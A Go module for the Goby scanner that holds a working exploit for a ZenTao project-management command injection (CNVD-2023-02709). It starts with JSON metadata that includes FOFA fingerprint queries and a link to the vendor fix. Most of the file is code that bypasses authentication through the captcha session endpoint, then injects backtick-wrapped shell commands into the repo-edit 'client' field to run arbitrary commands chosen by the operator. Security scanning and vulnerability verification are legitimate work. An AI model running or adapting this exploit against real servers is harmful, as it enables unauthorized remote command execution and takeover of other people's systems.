package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zentao project development and management system command injection vulnerability",
    "Description": "<p>Zen Tao R&amp;D project management software is a domestic open-source project management software. It focuses on R&amp;D project management, with built-in functions such as demand management, task management, bug management, defect management, use case management, plan release, etc., realizing the complete life cycle management of the software.</p><p>There is a command injection vulnerability in the Zen research and development project management software. An attacker can bypass the execution of combined background commands by using permissions, causing the system to be attacked and controlled.</p>",
    "Product": "ZenTao-System",
    "Homepage": "https://www.zentao.net/",
    "DisclosureDate": "2023-01-06",
    "Author": "1291904552@qq.com",
    "FofaQuery": "((title=\"欢迎使用禅道集成运行环境\" || body=\"<a id='zentaopro' href='/pro/'\" || body=\"$('#zentaopro').addClass\" || body=\"powered by <a href='http://www.zentao.net' target='_blank'>ZenTaoPMS\" || body=\"Welcome to use zentao!\" || body=\"href='/zentao/favicon.ico\" || header=\"path=/zentao/\" || (header=\"Set-Cookie: zentaosid=\" && header!=\"Content-Length: 0\")) && server!=\"360 web server\" && body!=\"Server: Netvox Z206-Webs\" && body!=\"Server: CPWS\") || banner=\"path=/zentao/\" || (banner=\"Set-Cookie: zentaosid=\" && banner!=\"Content-Length: 0\")",
    "GobyQuery": "((title=\"欢迎使用禅道集成运行环境\" || body=\"<a id='zentaopro' href='/pro/'\" || body=\"$('#zentaopro').addClass\" || body=\"powered by <a href='http://www.zentao.net' target='_blank'>ZenTaoPMS\" || body=\"Welcome to use zentao!\" || body=\"href='/zentao/favicon.ico\" || header=\"path=/zentao/\" || (header=\"Set-Cookie: zentaosid=\" && header!=\"Content-Length: 0\")) && server!=\"360 web server\" && body!=\"Server: Netvox Z206-Webs\" && body!=\"Server: CPWS\") || banner=\"path=/zentao/\" || (banner=\"Set-Cookie: zentaosid=\" && banner!=\"Content-Length: 0\")",
    "Level": "3",
    "Impact": "<p>There is a command injection vulnerability in the Zen research and development project management software. An attacker can bypass the execution of combined background commands by using permissions, causing the system to be attacked and controlled.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.zentao.net/download.html\">https://www.zentao.net/download.html</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/fSZdbujtmgTS-CPC7UebVQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-02709"
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "禅道研发项目管理系统命令注入漏洞",
            "Product": "易软天创-禅道系统",
            "Description": "<p>禅道研发项目管理软件是国产的开源项目管理软件,专注研发项目管理,内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能,实现了软件的完整生命周期管理。</p><p>禅道研发项目管理软件存在命令注入漏洞，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.zentao.net/download.html\" target=\"_blank\">https://www.zentao.net/download.html</a><br></p>",
            "Impact": "<p>禅道研发项目管理软件存在命令注入漏洞，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Zentao project development and management system command injection vulnerability",
            "Product": "ZenTao-System",
            "Description": "<p>Zen Tao R&amp;D project management software is a domestic open-source project management software. It focuses on R&amp;D project management, with built-in functions such as demand management, task management, bug management, defect management, use case management, plan release, etc., realizing the complete life cycle management of the software.</p><p>There is a command injection vulnerability in the Zen research and development project management software. An attacker can bypass the execution of combined background commands by using permissions, causing the system to be attacked and controlled.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.zentao.net/download.html\" target=\"_blank\">https://www.zentao.net/download.html</a><br></p>",
            "Impact": "<p>There is a command injection vulnerability in the Zen research and development project management software. An attacker can bypass the execution of combined background commands by using permissions, causing the system to be attacked and controlled.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10700"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 100000+rand.Intn(200000)
			Rand2 := 10000+rand.Intn(20000)
			windowsPayload := fmt.Sprintf("set /A %d - %d",Rand1,Rand2)
			LinuxPayload := fmt.Sprintf("expr %d - %d",Rand1,Rand2)

			uri1 := "/misc-captcha-user.html"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil {

			}
			uri2 := "/index.php?m=misc&f=captcha&sessionVar=user"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				uri3 := "/repo-create.html"
				cfg3 := httpclient.NewPostRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				cfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
				cfg3.Header.Store("X-Requested-With","XMLHttpRequest")
				cfg3.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
				cfg3.Header.Store("Referer",u.FixedHostInfo+"/repo-edit-1-0.html")
				cfg3.Data ="product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
				if _, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
					uri4 := "/repo-edit-10000-10000.html"
					cfg4 := httpclient.NewPostRequestConfig(uri4)
					cfg4.VerifyTls = false
					cfg4.FollowRedirect = false
					cfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
					cfg4.Header.Store("X-Requested-With","XMLHttpRequest")
					cfg4.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
					cfg4.Header.Store("Referer",u.FixedHostInfo+"/repo-edit-1-0.html")
					cfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",windowsPayload)
					if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
						if strings.Contains(resp4.RawBody, strconv.Itoa(Rand1-Rand2)){
							return true
						}

					}
					cfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",LinuxPayload)
					if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
						if strings.Contains(resp4.RawBody, strconv.Itoa(Rand1-Rand2)){
							return true
						}

					}


				}
			}

			zuri1 := "/zentao/misc-captcha-user.html"
			zcfg1 := httpclient.NewGetRequestConfig(zuri1)
			zcfg1.VerifyTls = false
			zcfg1.FollowRedirect = false
			zcfg1.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(u, zcfg1); err == nil {

			}
			zuri2 := "/zentao/index.php?m=misc&f=captcha&sessionVar=user"
			zcfg2 := httpclient.NewGetRequestConfig(zuri2)
			zcfg2.VerifyTls = false
			zcfg2.FollowRedirect = false
			zcfg2.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(u, zcfg2); err == nil {
				zuri3 := "/zentao/repo-create.html"
				zcfg3 := httpclient.NewPostRequestConfig(zuri3)
				zcfg3.VerifyTls = false
				zcfg3.FollowRedirect = false
				zcfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
				zcfg3.Header.Store("X-Requested-With","XMLHttpRequest")
				zcfg3.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
				zcfg3.Header.Store("Referer",u.FixedHostInfo+"/repo-edit-1-0.html")
				zcfg3.Data ="product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
				if _, err := httpclient.DoHttpRequest(u, zcfg3); err == nil {
					zuri4 := "/zentao/repo-edit-10000-10000.html"
					zcfg4 := httpclient.NewPostRequestConfig(zuri4)
					zcfg4.VerifyTls = false
					zcfg4.FollowRedirect = false
					zcfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
					zcfg4.Header.Store("X-Requested-With","XMLHttpRequest")
					zcfg4.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
					zcfg4.Header.Store("Referer",u.FixedHostInfo+"/repo-edit-1-0.html")
					zcfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",windowsPayload)
					if resp4, err := httpclient.DoHttpRequest(u, zcfg4); err == nil {
						if strings.Contains(resp4.RawBody, strconv.Itoa(Rand1-Rand2)){
							return true
						}

					}
					zcfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",LinuxPayload)
					if resp4, err := httpclient.DoHttpRequest(u, zcfg4); err == nil {
						if strings.Contains(resp4.RawBody, strconv.Itoa(Rand1-Rand2)){
							return true
						}

					}


				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/misc-captcha-user.html"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {

			}
			uri2 := "/index.php?m=misc&f=captcha&sessionVar=user"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				uri3 := "/repo-create.html"
				cfg3 := httpclient.NewPostRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				cfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
				cfg3.Header.Store("X-Requested-With","XMLHttpRequest")
				cfg3.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
				cfg3.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/repo-edit-1-0.html")
				cfg3.Data ="product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
					uri4 := "/repo-edit-10000-10000.html"
					cfg4 := httpclient.NewPostRequestConfig(uri4)
					cfg4.VerifyTls = false
					cfg4.FollowRedirect = false
					cfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
					cfg4.Header.Store("X-Requested-With","XMLHttpRequest")
					cfg4.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
					cfg4.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/repo-edit-1-0.html")
					cfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",cmd)
					if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
						if strings.Contains(resp4.RawBody, "{\"client\""){
							expResult.Output = resp4.RawBody
							expResult.Success = true
						}

					}


				}
			}

			zuri1 := "/zentao/misc-captcha-user.html"
			zcfg1 := httpclient.NewGetRequestConfig(zuri1)
			zcfg1.VerifyTls = false
			zcfg1.FollowRedirect = false
			zcfg1.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, zcfg1); err == nil {

			}
			zuri2 := "/zentao/index.php?m=misc&f=captcha&sessionVar=user"
			zcfg2 := httpclient.NewGetRequestConfig(zuri2)
			zcfg2.VerifyTls = false
			zcfg2.FollowRedirect = false
			zcfg2.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, zcfg2); err == nil {
				zuri3 := "/zentao/repo-create.html"
				zcfg3 := httpclient.NewPostRequestConfig(zuri3)
				zcfg3.VerifyTls = false
				zcfg3.FollowRedirect = false
				zcfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
				zcfg3.Header.Store("X-Requested-With","XMLHttpRequest")
				zcfg3.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
				zcfg3.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/repo-edit-1-0.html")
				zcfg3.Data ="product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, zcfg3); err == nil {
					zuri4 := "/zentao/repo-edit-10000-10000.html"
					zcfg4 := httpclient.NewPostRequestConfig(zuri4)
					zcfg4.VerifyTls = false
					zcfg4.FollowRedirect = false
					zcfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
					zcfg4.Header.Store("X-Requested-With","XMLHttpRequest")
					zcfg4.Header.Store("Cookie","zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default")
					zcfg4.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/repo-edit-1-0.html")
					zcfg4.Data =fmt.Sprintf("SCM=Subversion&client=`%s`",cmd)
					if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, zcfg4); err == nil {
						if strings.Contains(resp4.RawBody, "{\"client\""){
							expResult.Output = resp4.RawBody
							expResult.Success = true
						}

					}

				}
			}
			return expResult
		},
	))
}